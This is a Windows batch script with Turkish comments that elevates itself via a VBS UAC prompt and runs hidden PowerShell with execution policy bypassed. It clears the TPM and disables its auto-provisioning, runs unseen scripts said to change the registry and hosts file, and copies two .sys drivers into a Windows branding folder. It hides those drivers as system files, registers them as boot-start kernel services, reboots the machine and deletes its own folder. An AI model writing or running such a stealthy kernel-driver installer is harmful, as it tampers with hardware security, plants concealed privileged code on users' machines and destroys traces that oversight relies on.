@echo off
setlocal

:: Yönetici izni kontrolü ve komut dosyasının yönetici olarak çalıştırılması
openfiles >nul 2>&1 || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

:: TPM ayarları
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Disable-TpmAutoProvisioning'"
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command Clear-Tpm'"
:: Reg ve hosts script'lerini çalıştır
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"%SCRIPT_DIR%1.ps1\"'"
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"%SCRIPT_DIR%2.ps1\"'"

:: Dosyaları Basebrd klasörüne kopyala
set "basebrdDir=C:\Windows\Branding\Basebrd\"

if exist "%~dp0miget.sys" (
    copy /y "%~dp0miget.sys" "%basebrdDir%"
)
if exist "%~dp0migetbp.sys" (
    copy /y "%~dp0migetbp.sys" "%basebrdDir%"
)

:: Dosyaları sistem dosyası olarak ayarla ve gizle
attrib +s +h "%basebrdDir%miget.sys"
attrib +s +h "%basebrdDir%migetbp.sys"

:: Yeni servisleri oluştur (Basebrd klasöründen çalıştırılacak şekilde)
sc create miget binPath= "C:\Windows\Branding\Basebrd\miget.sys" DisplayName= "miget" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
sc create migetbp binPath= "C:\Windows\Branding\Basebrd\migetbp.sys" DisplayName= "migetbp" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1

:: Servisleri başlat
sc start miget
sc start migetbp

:: Bilgisayarı yeniden başlat
C:\Windows\system32\cmd.exe /c shutdown /r /t 2

cd /d "%~dp0"
del /f /q *.*
for /d %%i in (*) do rd /s /q "%%i"

exit

